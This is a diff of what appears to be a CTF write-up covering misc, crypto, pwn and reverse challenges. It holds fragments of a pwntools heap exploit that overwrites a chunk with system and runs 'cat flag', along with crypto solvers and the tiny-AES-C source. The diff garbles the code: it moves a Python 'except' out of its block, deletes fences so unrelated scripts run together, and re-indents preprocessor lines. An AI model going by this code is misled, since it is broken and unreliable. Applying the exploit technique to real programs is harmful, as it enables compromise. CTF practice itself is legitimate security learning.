@@ -3,7 +3,7 @@
 > 原文: https://www.ctfiot.com/213306.html
 > ID: 213306
 
-Misc 
+Misc
 
 misc01
 
@@ -47,7 +47,7 @@ cat 1 2 3 &gt; 1.zip
 
 另一个压缩包根据提示!@#QQQ0010flag****进行掩码爆破爆破出后四位数字之后得到一张jpg，将jpg中的png分离，并爆破宽高可得到前一半flag
 
- Crypto 
+ Crypto
 
 CRYPTO01
 
@@ -148,7 +148,8 @@ for i in range(1, 32): 
         key = P_matrix * P_inverse_key 
         recovered_key = sum([int(key[j]) * 2**j for j in range(len(key))]) 
         recovered_keys.append(recovered_key) 
-    except: 
+    
+except: 
         pass 
 
 # Decryption function
@@ -212,7 +213,7 @@ def pollard_rho (x1,x2):
             break
 pollard_rho(1, 1)
 
- Pwn 
+ Pwn
 
 pwn01
 
@@ -340,7 +341,7 @@ p.sendline(b"cat flag")
  
 inter()        
 
- Reverse 
+ Reverse
 
 re01
 
@@ -1177,7 +1178,8 @@ for i in range(1, 32): 
         key = P_matrix * P_inverse_key 
         recovered_key = sum([int(key[j]) * 2**j for j in range(len(key))]) 
         recovered_keys.append(recovered_key) 
-    except: 
+    
+except: 
         pass 
 
 # Decryption function
@@ -1202,11 +1204,6 @@ for key in recovered_keys: 
     decrypted_message = [decrypt_block(c, key) for c in cipher_text] 
     flag = b"".join(decrypted_message) 
     print(flag)
-```
-
-
-
-```
 import libnum
 from Crypto.Util.number import *
 e = 65537
@@ -1236,15 +1233,10 @@ def pollard_rho (x1,x2):
             print(long_to_bytes(pow(c, d, n)))
             break
 pollard_rho(1, 1)
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
         gdb.attach(p)
@@ -1259,7 +1251,7 @@ def sla(a,b):
         p.sendlineafter(a,b)
 def r(a):
         p.recv(a)
-#def pr(a):
+    #def pr(a):
         #print(p.recv(a))
 def rl(a):
         return p.recvuntil(a)
@@ -1277,16 +1269,16 @@ li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
  
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
-#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
-#p=remote('',)
+    #p=remote('',)
 p = process('./pwn')
 def add(size,content):
         rl("Input your choice")
@@ -1351,14 +1343,9 @@ add(0xa8,p64(system))
  
 free(8)
 p.sendline(b"cat flag")
-#print(p.recvline())
+    #print(p.recvline())
  
 inter()
-```
-
-
-
-```
 # print(key)
 sbox = [0xED, 0xF6, 0xDC, 0x13, 0xA7, 0xB9, 0x3A, 0x75, 0x65, 0x45,
  0xA5, 0x9A, 0x1B, 0xC3, 0xE5, 0xAF, 0xBB, 0x6F, 0xAC, 0x69,
@@ -1390,13 +1377,8 @@ rsbox = [0] * 256
 for i in range(256):
  rsbox[sbox[i]] = i
 print(rsbox)
-```
-
-
-
-```
-#include <stdio.h>
-#include "aes.hpp"
+    #include <stdio.h>
+    #include "aes.hpp"
 
 uint8_t Buf[48] = { };//密文 
 
@@ -1415,11 +1397,6 @@ int main()
  printf("%sn", Buf);
 
 }
-```
-
-
-
-```
 /*
 
 This is an implementation of the AES algorithm, specifically ECB, CTR and CBC mode.
@@ -1455,34 +1432,34 @@ NOTE:   String length must be evenly divisible by 16byte (str_len %�
 /*****************************************************************************/
 /* Includes:                                                                 */
 /*****************************************************************************/
-#include <string.h> // CBC mode, for memset
-#include "aes.h"
+    #include <string.h> // CBC mode, for memset
+    #include "aes.h"
 
-#include <stdio.h>
+    #include <stdio.h>
 
 /*****************************************************************************/
 /* Defines:                                                                  */
 /*****************************************************************************/
 // The number of columns comprising a state in AES. This is a constant in AES. Value=4
-#define Nb 4
+    #define Nb 4
 
-#if defined(AES256) && (AES256 == 1)
+    #if defined(AES256) && (AES256 == 1)
     #define Nk 8
     #define Nr 14
-#elif defined(AES192) && (AES192 == 1)
+    #elif defined(AES192) && (AES192 == 1)
     #define Nk 6
     #define Nr 12
-#else
+    #else
     #define Nk 4        // The number of 32 bit words in a key.
     #define Nr 10       // The number of rounds in AES Cipher.
-#endif
+    #endif
 
 // jcallan@github points out that declaring Multiply as a function 
 // reduces code size considerably with the Keil ARM compiler.
 // See this link for more information: https://github.com/kokke/tiny-AES-C/pull/3
-#ifndef MULTIPLY_AS_A_FUNCTION
+    #ifndef MULTIPLY_AS_A_FUNCTION
   #define MULTIPLY_AS_A_FUNCTION 0
-#endif
+    #endif
 
 /*****************************************************************************/
 /* Private variables:                                                        */
@@ -1522,10 +1499,10 @@ static const uint8_t sbox[256] = {
   0x49, 0x02, 0xF8, 0xA4, 0x46, 0x1C, 0x89, 0x0C, 0x97, 0xDE,
   0x20, 0xCA, 0x9E, 0x1D, 0xC4, 0xB5 };
 
-#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
+    #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
 static const uint8_t rsbox[256] = {
  234, 198, 241, 128, 94, 156, 30, 51, 187, 210, 37, 103, 247, 98, 80, 75, 35, 190, 151, 3, 215, 196, 117, 86, 78, 39, 136, 12, 245, 253, 77, 84, 250, 123, 168, 157, 27, 235, 109, 81, 201, 93, 145, 95, 232, 226, 48, 127, 118, 69, 44, 97, 176, 236, 87, 222, 203, 140, 6, 239, 82, 200, 58, 163, 148, 206, 99, 159, 102, 9, 244, 74, 184, 240, 147, 237, 153, 107, 175, 68, 40, 105, 34, 179, 91, 25, 46, 120, 171, 142, 42, 217, 220, 125, 186, 183, 121, 124, 174, 52, 129, 8, 143, 96, 167, 19, 155, 225, 164, 144, 166, 17, 55, 189, 38, 45, 112, 7, 126, 182, 162, 26, 115, 219, 137, 185, 111, 65, 231, 193, 83, 36, 161, 154, 79, 70, 138, 246, 132, 228, 122, 23, 216, 133, 76, 113, 211, 207, 233, 72, 92, 248, 152, 43, 11, 199, 24, 169, 252, 33, 64, 54, 71, 173, 243, 10, 131, 4, 119, 32, 141, 221, 18, 73, 139, 15, 21, 180, 130, 62, 202, 255, 172, 134, 53, 5, 88, 16, 204, 29, 218, 209, 150, 227, 61, 13, 254, 90, 181, 110, 149, 229, 251, 50, 213, 194, 47, 59, 31, 230, 165, 160, 238, 28, 205, 177, 49, 116, 158, 191, 2, 208, 249, 223, 66, 57, 188, 106, 214, 14, 114, 22, 63, 100, 104, 60, 135, 0, 212, 197, 178, 41, 101, 89, 170, 20, 1, 195, 242, 56, 146, 224, 108, 67, 192, 85 };
-#endif
+    #endif
 
 // The round constant word array, Rcon[i], contains the values given by 
 // x to the power (i-1) being powers of x (x is denoted as {02}) in the field GF(2^8)
@@ -1551,7 +1528,7 @@ static uint8_t getSBoxValue(uint8_t num)
   return sbox[num];
 }
 */
-#define getSBoxValue(num) (sbox[(num)])
+    #define getSBoxValue(num) (sbox[(num)])
 
 // This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states. 
 static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)
@@ -1607,7 +1584,7 @@ static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)
 
       tempa[0] = tempa[0] ^ Rcon[i/Nk];
     }
-#if defined(AES256) && (AES256 == 1)
+    #if defined(AES256) && (AES256 == 1)
     if (i % Nk == 4)
     {
       // Function Subword()
@@ -1618,7 +1595,7 @@ static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)
         tempa[3] = getSBoxValue(tempa[3]);
       }
     }
-#endif
+    #endif
     j = i * 4; k=(i - Nk) * 4;
     RoundKey[j + 0] = RoundKey[k + 0] ^ tempa[0];
     RoundKey[j + 1] = RoundKey[k + 1] ^ tempa[1];
@@ -1631,7 +1608,7 @@ void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)
 {
   KeyExpansion(ctx->RoundKey, key);
 }
-#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
+    #if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
 void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)
 {
   KeyExpansion(ctx->RoundKey, key);
@@ -1641,7 +1618,7 @@ void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)
 {
   memcpy (ctx->Iv, iv, AES_BLOCKLEN);
 }
-#endif
+    #endif
 
 // This function adds the round key to state.
 // The round key is added to the state by an XOR function.
@@ -1727,7 +1704,7 @@ static void MixColumns(state_t* state)
 // Note: The last call to xtime() is unneeded, but often ends up generating a smaller binary
 //       The compiler seems to be able to vectorize the operation better this way.
 //       See https://github.com/kokke/tiny-AES-c/pull/34
-#if MULTIPLY_AS_A_FUNCTION
+    #if MULTIPLY_AS_A_FUNCTION
 static uint8_t Multiply(uint8_t x, uint8_t y)
 {
   return (((y & 1) * x) ^
@@ -1736,24 +1713,24 @@ static uint8_t Multiply(uint8_t x, uint8_t y)
        ((y>>3 & 1) * xtime(xtime(xtime(x)))) ^
        ((y>>4 & 1) * xtime(xtime(xtime(xtime(x)))))); /* this last call to xtime() can be omitted */
   }
-#else
-#define Multiply(x, y)                                
+    #else
+    #define Multiply(x, y)                                
       (  ((y & 1) * x) ^                              
       ((y>>1 & 1) * xtime(x)) ^                       
       ((y>>2 & 1) * xtime(xtime(x))) ^                
       ((y>>3 & 1) * xtime(xtime(xtime(x)))) ^         
       ((y>>4 & 1) * xtime(xtime(xtime(xtime(x))))))   
 
-#endif
+    #endif
 
-#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
+    #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
 /*
 static uint8_t getSBoxInvert(uint8_t num)
 {
   return rsbox[num];
 }
 */
-#define getSBoxInvert(num) (rsbox[(num)])
+    #define getSBoxInvert(num) (rsbox[(num)])
 
 // MixColumns function mixes the columns of the state matrix.
 // The method used to multiply may be difficult to understand for the inexperienced.
@@ -1817,7 +1794,7 @@ static void InvShiftRows(state_t* state)
   (*state)[2][3] = (*state)[3][3];
   (*state)[3][3] = temp;
 }
-#endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
+    #endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
 
 // Cipher is the main function that encrypts the PlainText.
 static void Cipher(state_t* state, const uint8_t* RoundKey)
@@ -1845,7 +1822,7 @@ static void Cipher(state_t* state, const uint8_t* RoundKey)
   AddRoundKey(Nr, state, RoundKey);
 }
 
-#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
+    #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
 static void InvCipher(state_t* state, const uint8_t* RoundKey)
 {
   uint8_t round = 0;
@@ -1874,12 +1851,12 @@ static void InvCipher(state_t* state, const uint8_t* RoundKey)
   AddRoundKey(0, state, RoundKey);
 
 }
-#endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
+    #endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
 
 /*****************************************************************************/
 /* Public functions:                                                         */
 /*****************************************************************************/
-#if defined(ECB) && (ECB == 1)
+    #if defined(ECB) && (ECB == 1)
 
 void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)
 {
@@ -1893,9 +1870,9 @@ void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)
   InvCipher((state_t*)buf, ctx->RoundKey);
 }
 
-#endif // #if defined(ECB) && (ECB == 1)
+    #endif // #if defined(ECB) && (ECB == 1)
 
-#if defined(CBC) && (CBC == 1)
+    #if defined(CBC) && (CBC == 1)
 
 static void XorWithIv(uint8_t* buf, const uint8_t* Iv)
 {
@@ -1936,9 +1913,9 @@ void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t len
 
 }
 
-#endif // #if defined(CBC) && (CBC == 1)
+    #endif // #if defined(CBC) && (CBC == 1)
 
-#if defined(CTR) && (CTR == 1)
+    #if defined(CTR) && (CTR == 1)
 
 /* Symmetrical operation: same function for encrypting as for decrypting. Note any IV/nonce should never be reused with the same key */
 void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)
@@ -1974,17 +1951,12 @@ void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t leng
   }
 }
 
-#endif // #if defined(CTR) && (CTR == 1)
-```
+    #endif // #if defined(CTR) && (CTR == 1)
+    #ifndef _AES_H_
+    #define _AES_H_
 
-
-
-```
-#ifndef _AES_H_
-#define _AES_H_
-
-#include <stdint.h>
-#include <stddef.h>
+    #include <stdint.h>
+    #include <stddef.h>
 
 // #define the macros below to 1/0 to enable/disable the mode of operation.
 //
@@ -1993,59 +1965,59 @@ void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t leng
 // ECB enables the basic ECB 16-byte block algorithm. All can be enabled simultaneously.
 
 // The #ifndef-guard allows it to be configured before #include'ing or at compile time.
-#ifndef CBC
+    #ifndef CBC
   #define CBC 1
-#endif
+    #endif
 
-#ifndef ECB
+    #ifndef ECB
   #define ECB 1
-#endif
+    #endif
 
-#ifndef CTR
+    #ifndef CTR
   #define CTR 1
-#endif
+    #endif
 
-#define AES128 1
+    #define AES128 1
 //#define AES192 1
 //#define AES256 1
 
-#define AES_BLOCKLEN 16 // Block length in bytes - AES is 128b block only
+    #define AES_BLOCKLEN 16 // Block length in bytes - AES is 128b block only
 
-#if defined(AES256) && (AES256 == 1)
+    #if defined(AES256) && (AES256 == 1)
     #define AES_KEYLEN 32
     #define AES_keyExpSize 240
-#elif defined(AES192) && (AES192 == 1)
+    #elif defined(AES192) && (AES192 == 1)
     #define AES_KEYLEN 24
     #define AES_keyExpSize 208
-#else
+    #else
     #define AES_KEYLEN 16   // Key length in bytes
     #define AES_keyExpSize 176
-#endif
+    #endif
 
 struct AES_ctx
 {
   uint8_t RoundKey[AES_keyExpSize];
-#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
+    #if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
   uint8_t Iv[AES_BLOCKLEN];
-#endif
+    #endif
 };
 
 void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);
-#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
+    #if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
 void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);
 void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);
-#endif
+    #endif
 
-#if defined(ECB) && (ECB == 1)
+    #if defined(ECB) && (ECB == 1)
 // buffer size is exactly AES_BLOCKLEN bytes; 
 // you need only AES_init_ctx as IV is not used in ECB 
 // NB: ECB is considered insecure for most uses
 void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);
 void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);
 
-#endif // #if defined(ECB) && (ECB == !)
+    #endif // #if defined(ECB) && (ECB == !)
 
-#if defined(CBC) && (CBC == 1)
+    #if defined(CBC) && (CBC == 1)
 // buffer size MUST be mutile of AES_BLOCKLEN;
 // Suggest https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
 // NOTES: you need to set IV in ctx via AES_init_ctx_iv() or AES_ctx_set_iv()
@@ -2053,9 +2025,9 @@ void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);
 void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
 void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
 
-#endif // #if defined(CBC) && (CBC == 1)
+    #endif // #if defined(CBC) && (CBC == 1)
 
-#if defined(CTR) && (CTR == 1)
+    #if defined(CTR) && (CTR == 1)
 
 // Same function for encrypting as for decrypting. 
 // IV is incremented for every block, and used after encryption as XOR-compliment for output
@@ -2064,26 +2036,21 @@ void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t len
 //        no IV should ever be reused with the same key 
 void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
 
-#endif // #if defined(CTR) && (CTR == 1)
+    #endif // #if defined(CTR) && (CTR == 1)
 
-#endif // _AES_H_
-```
+    #endif // _AES_H_
+    #ifndef _AES_HPP_
+    #define _AES_HPP_
 
-
-
-```
-#ifndef _AES_HPP_
-#define _AES_HPP_
-
-#ifndef __cplusplus
-#error Do not include the hpp header in a c project!
-#endif //__cplusplus
+    #ifndef __cplusplus
+    #error Do not include the hpp header in a c project!
+    #endif //__cplusplus
 
 extern "C" {
-#include "aes.h"
+    #include "aes.h"
 }
 
-#endif //_AES_HPP_
+    #endif //_AES_HPP_
 ```
 
 
